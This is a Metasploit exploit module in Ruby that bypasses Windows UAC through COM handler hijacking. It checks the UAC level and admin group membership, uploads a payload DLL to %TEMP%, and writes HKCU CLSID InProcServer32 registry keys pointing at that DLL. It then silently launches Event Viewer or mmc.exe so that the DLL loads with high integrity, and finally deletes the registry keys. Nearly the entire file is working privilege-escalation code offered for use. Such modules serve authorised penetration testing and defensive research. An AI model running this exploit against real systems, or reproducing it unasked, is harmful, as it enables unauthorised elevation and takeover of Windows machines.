##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas
  include Exploit::FileDropper

  CLSID_PATH       = "HKCU\\Software\\Classes\\CLSID"
  DEFAULT_VAL_NAME = '' # This maps to "(Default)"

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)',
      'Description'   => %q{
        This module will bypass Windows UAC by creating COM handler registry entries in the
        HKCU hive. When certain high integrity processes are loaded, these registry entries
        are referenced resulting in the process loading user-controlled DLLs. These DLLs
        contain the payloads that result in elevated sessions. Registry key modifications
        are cleaned up after payload invocation.

        This module requires the architecture of the payload to match the OS, but the
        current low-privilege Meterpreter session architecture can be different. If
        specifying EXE::Custom your DLL should call ExitProcess() after starting your
        payload in a separate process.

        This module invokes the target binary via cmd.exe on the target. Therefore if
        cmd.exe access is restricted, this module will not run correctly.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Matt Nelson',    # UAC bypass discovery and research
          'b33f',           # UAC bypass discovery and research
          'OJ Reeves'       # MSF module
        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Targets'       => [
          ['Automatic', {}]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [
          'URL', 'https://www.youtube.com/watch?v=3gz1QmiHhss',
          'URL', 'https://wikileaks.org/ciav7p1/cms/page_13763373.html',
          'URL', 'https://github.com/FuzzySecurity/Defcon25/Defcon25_UAC-0day-All-Day_v1.2.pdf',
        ]
      ],
      'DisclosureDate'=> 'Jan 01 1900'
    ))
  end

  def check
    if sysinfo['OS'] =~ /Windows (7|8|10|2008|2012|2016)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    # Make sure we have a sane payload configuration
    if sysinfo['Architecture'] != payload_instance.arch.first
      fail_with(Failure::BadConfig, "#{payload_instance.arch.first} payload selected for #{sysinfo['Architecture']} system")
    end

    registry_view = REGISTRY_VIEW_NATIVE
    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      registry_view = REGISTRY_VIEW_64_BIT
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Failure::NotVulnerable,
                  "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good('UAC is set to Default')
        print_good('BypassUAC can bypass this setting, continuing...')
      when UAC_NO_PROMPT
        print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
        shell_execute_exe
        return
    end

    payload = generate_payload_dll({:dll_exitprocess => true})
    commspec = expand_path('%COMSPEC%')
    dll_name = expand_path("%TEMP%\\#{rand_text_alpha(8)}.dll")
    hijack = hijack_com(registry_view, dll_name)

    unless hijack && hijack[:cmd_path]
      fail_with(Failure::Unknown, 'Unable to hijack COM')
    end

    begin
      print_status("Targeting #{hijack[:name]} via #{hijack[:root_key]} ...")
      print_status("Uploading payload to #{dll_name} ...")
      write_file(dll_name, payload)
      register_file_for_cleanup(dll_name)

      print_status("Executing high integrity process ...")
      args = "/c #{expand_path(hijack[:cmd_path])}"
      args << " #{hijack[:cmd_args]}" if hijack[:cmd_args]

      # Launch the application from cmd.exe instead of directly so that we can
      # avoid the dreaded 740 error (elevation requried)
      client.sys.process.execute(commspec, args, {'Hidden' => true})

      # Wait a copule of seconds to give the payload a chance to fire before cleaning up
      Rex::sleep(5)

      handler(client)

    ensure
      print_status("Cleaining up registry ...")
      registry_deletekey(hijack[:root_key], registry_view)
    end
  end

  # TODO: Add more hijack points when they're known.
  # TODO: when more class IDs are found for individual hijackpoints
  # they can be added to the array of class IDs.
  @@hijack_points = [
    {
      name: 'Event Viewer',
      cmd_path: '%WINDIR%\System32\eventvwr.exe',
      class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931']
    },
    {
      name: 'Computer Managment',
      cmd_path: '%WINDIR%\System32\mmc.exe',
      cmd_args: 'CompMgmt.msc',
      class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931']
    }
  ]

  #
  # Perform the hijacking of COM class IDS. This function chooses a random
  # application target and a random class id associated with it before
  # modifying the registry.
  #
  def hijack_com(registry_view, dll_path)
    target = @@hijack_points.sample
    target_clsid = target[:class_ids].sample
    root_key = "#{CLSID_PATH}\\{#{target_clsid}}"
    inproc_key = "#{root_key}\\InProcServer32"
    shell_key = "#{root_key}\\ShellFolder"

    registry_createkey(root_key, registry_view)
    registry_createkey(inproc_key, registry_view)
    registry_createkey(shell_key, registry_view)

    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, 'REG_SZ', registry_view)
    registry_setvaldata(inproc_key, 'ThreadingModel', 'Apartment', 'REG_SZ', registry_view)
    registry_setvaldata(inproc_key, 'LoadWithoutCOM', '', 'REG_SZ', registry_view)
    registry_setvaldata(shell_key, 'HideOnDesktop', '', 'REG_SZ', registry_view)
    registry_setvaldata(shell_key, 'Attributes', 0xf090013d, 'REG_DWORD', registry_view)

    {
      name:     target[:name],
      cmd_path: target[:cmd_path],
      cmd_args: target[:cmd_args],
      root_key: root_key
    }
  end

  def check_permissions!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
    end

    print_status('UAC is Enabled, checking level...')
    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end
end